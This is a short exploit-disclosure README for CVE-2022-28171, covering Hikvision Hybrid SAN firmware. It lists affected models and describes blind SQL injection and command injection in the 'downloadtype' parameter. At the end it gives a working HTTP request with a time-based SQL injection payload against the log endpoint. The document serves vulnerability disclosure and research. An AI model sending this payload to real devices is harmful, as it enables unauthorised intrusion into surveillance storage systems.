# CVE-2022-28171-POC

I originally published this on ExploitDB, which you can find at https://www.exploit-db.com/exploits/51607

### Hikvision Hybrid SAN Ds-a71024 Firmware - Multiple Remote Code Execution

```
# Date: 16  July 2023
# Exploit Author: Thurein Soe
# CVE : CVE-2022-28171
# Reference Link: https://cve.report/CVE-2022-28171
# Vulnerable Versions:
Ds-a71024 Firmware
Ds-a71024 Firmware
Ds-a71048r-cvs Firmware
Ds-a71048 Firmware
Ds-a71072r Firmware
Ds-a71072r Firmware
Ds-a72024 Firmware
Ds-a72024 Firmware
Ds-a72048r-cvs Firmware
Ds-a72072r Firmware
Ds-a80316s Firmware
Ds-a80624s Firmware
Ds-a81016s Firmware
Ds-a82024d Firmware
Ds-a71048r-cvs
Ds-a71024
Ds-a71048
Ds-a71072r
Ds-a80624s
Ds-a82024d
Ds-a80316s
Ds-a81016s
```
### Vendor Description:

Hikvision is a world-leading surveillance manufacturer and supplier of video surveillance and Internet of Things (IoT) equipment for civilian and military purposes. Some Hikvision Hybrid SAN products were vulnerable to multiple remote code execution vulnerabilities such as command injection, Blind SQL injection, HTTP request smuggling, and reflected cross-site scripting. This resulted in remote code execution, which was possible to execute arbitrary operating system commands and more.

### Vulnerability description
 The manual test confirmed that The "downloadtype" parameter was vulnerable to Blind SQL injection and Command Injection.
I created a Python script to automate and enumerate SQL versions as the Application was behind the firewall and block all the requests from SQLmap. 

### Request Body
```
Request Body:
GET /web/log/dynamic_log.php?target=makeMaintainLog&downloadtype='(select*from(select(sleep(10)))a)' HTTP/1.1
Host: X.X.X.X.12:2004
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Connection: close
```
